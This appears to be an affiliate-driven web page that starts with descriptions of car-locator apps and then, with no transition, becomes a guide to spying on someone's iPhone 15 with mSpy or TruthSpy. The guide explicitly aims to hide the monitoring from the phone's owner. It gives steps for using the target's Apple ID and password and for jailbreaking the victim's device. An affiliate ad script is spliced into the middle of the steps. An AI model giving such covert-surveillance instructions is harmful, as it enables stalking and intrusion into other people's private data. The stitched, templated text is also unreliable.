## Option 3: Automatic

It works by connecting our car with the mobile phone and allowing us to know at all times the location of our car, something very useful in case of missing or even theft. In addition, in case of an accident, we can notify the emergency services through the same application.

It is available for iOS. Apart from looking for the car, this app allows us to control through Bluetooth also the consumption of gasoline, the effort that has made the engine, if you suffer and how to avoid it while advising us on how to achieve and maintain optimal driving.

## Option 4: Google Maps (It will be available in the next version)

Introduction: This application is implementing new features for drivers to find parking more easily. It tries to help those forgetful drivers who park but then do not know where they parked the vehicle. For them, Maps is responsible for collecting information on the time in which they have been stopped after moving by car, if we have the mobile connected to the car by Bluetooth, the application understands that we have been using a vehicle, and shows the parking with a round blue icon with a capital P inside. If this does not appear, it can also be saved in another way. Once parked you can open the map of the application and click on the blue point of location. At that time it gives us the option to Save your parking leaving the blue icon mentioned above.

The second functionality of Google Maps in developing is the option to know where we can find available parking. In addition to the information collected by the application of our travels, it is able to show the most traveled places and with or greater parking so it can inform you where you are most likely to find parking. How does it work? A small red icon with a blank P appears next to the destination that we selected in our search. Next to the letter appears a text that indicates information about the parking in that zone.

Unfortunately, these options are not yet implemented on all Android and iOS smartphones. If our mobile phone does not yet have any of these features wait for the latest update as it is expected to be available on these operating systems very soon as a car locator device.

**Features:**

GPS locator for car

Shows available parking.

## Solutions to Spy on Apple iPhone 15 with and without jailbreak

It is no secret that you can easily spy on any iPhone. Many spy or monitoring programs make it easy. All you have do is have access to the iPhone you want to spy on and have a reliable spy program. The problem is, there are some spy programs that will only work on a jailbroken device. This can be a problem when you don’t want the Apple iPhone 15 device’s owner to know of your activities and the owner has no intention to jailbreak their device.

In this article, we look at how you to spy on an iPhone without needing a jailbreak and how to spy on a jailbroken device or jailbreak a device to facilitate spying.


## Part 1: How to Spy on iPhone without Jailbreak

The majority of spy apps in the market will only work on a jailbroken device or require you to jailbreak an iPhone before you can use them. While a jailbroken device does have its advantages, it can be quite problematic when you want to spy on an iPhone without alerting the owner to your activities. To begin with, you must have the iPhone to jailbreak it, a factor that makes it easier to get caught trying to spy on the Apple iPhone 15 device. Also, it is quite possible no matter how hard you try to hide the jailbreaking app that the owner will realize you have jailbroken their device.

For the best results you want to use a monitoring program that doesn’t require a jailbroken device to work. The best is [mSpy](http://mspy.go2cloud.org/SH7G6), a monitoring program that will work on any iPhone and provide you with detailed information without the need to jailbreak the Apple iPhone 15 device. Here’s how to use mSpy to spy on an iPhone.

Step 1: Begin by activating iCloud Backup on the target device. Go to Settings and then select “iCloud” to do this. Using mSpy will require iCloud to be activated.

Step 2: The first step is to create an account with mSpy. You can then purchase a subscription based on the type of information you need from the target device and the duration you want to spend spying on the Apple iPhone 15 device.

Step 3: Once you’ve registered and purchased the subscription, you will receive an email from mSpy with all the information you need to install the program.

Step 4: You can then log in to your [mSpy](http://mspy.go2cloud.org/SH7G6) control panel and add the Apple ID and password of the Apple iPhone 15 device to gain access to the information you need on the Apple iPhone 15 device.

## Part 2: How to Spy using Spyware that Requires a Jailbreak

Being able to spy on an iPhone without a jailbreak is not something that happens often. This is because unlike mSpy, most monitoring software will require you jailbreak the Apple iPhone 15 device before you can install the software. One of those apps is TruthSpy. Like mSpy, this app will allow users to see all types of data on the target device without the owner of the Apple iPhone 15 device knowing they are being monitored. The only problem is, you need to have access to the Apple iPhone 15 device to jailbreak it. If this is what you prefer or are unable to get access to mSpy, TruthSpy will work just fine. Here’s how to use it.

Step 1: Begin by performing a jailbreak on the target device. There are several options to help you do that like Pangu software.

	<div style="width:125px;text-align:center"><a href="javascript:window.open(decodeURIComponent('https%3A%2F%2Faligracehair.sjv.io%2Fc%2F5597632%2F1743243%2F19272'), '_blank');void(0);">Click here</a></div>

<!-- affiliate ads end -->
Step 2: Once the Apple iPhone 15 device is successfully jailbroken, create an account with TruthSpy, purchase a subscription and you will receive instructions on how to install the software on the jailbroken device.

Step 3: You can then log in to TurthSpy with your log in information and access all types of data on the target iPhone from any bowser.

![Spy using Spyware with jailbreak-log in to TurthSpy](https://images.wondershare.com/drfone/article/2017/10/15079742762274.jpg)

Both mSpy and TruthSpy will provide you with all the information you need about the target device. The only difference is, you need to jailbreak the Apple iPhone 15 device if TruthSpy will be able to access it. Jailbreaking the

device will however make it easier for the Apple iPhone 15 device’s owner to find the spyware and remove it before you are able to complete your activities. It is therefore preferable to use a program like mSpy that requires no jailbreak.
